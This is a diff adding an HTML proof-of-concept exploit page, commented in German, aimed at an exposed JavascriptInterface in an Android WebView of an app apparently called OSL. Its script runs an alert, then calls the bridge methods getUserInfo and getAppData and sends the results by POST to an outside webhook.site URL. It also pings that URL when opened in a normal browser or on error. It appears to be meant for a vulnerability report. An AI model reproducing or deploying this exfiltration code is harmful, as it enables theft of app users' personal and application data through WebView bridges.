@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OSL Exploit Proof of Concept</title>
+</head>
+<body>
+    <h1>OSL App Security PoC</h1>
+    <p>Wenn du das siehst, wurde die bösartige URL erfolgreich im WebView geladen.</p>
+
+    <script>
+        // 1. Visueller Beweis für das Video (Alert-Box)
+        alert("Exploit Success: Arbitrary JS Execution inside OSL Context!");
+
+        // 2. Daten-Exfiltration über das anfällige JavascriptInterface
+        try {
+            if (window.control) {
+                // Wir übergeben ein Test-Argument, da die Methoden im Code ein String-Argument erwarten
+                var userInfo = window.control.getUserInfo("poc_test");
+                var appData = window.control.getAppData("poc_test");
+
+                // Daten per POST an deinen Webhook senden
+                fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        vulnerability: "Exposed JavascriptInterface",
+                        extracted_userInfo: userInfo || "null/empty",
+                        extracted_appData: appData || "null/empty"
+                    })
+                });
+            } else {
+                fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d?status=opened_in_regular_browser');
+            }
+        } catch(e) {
+            fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d?error=' + encodeURIComponent(e.message));
+        }
+    </script>
+</body>
+</html>
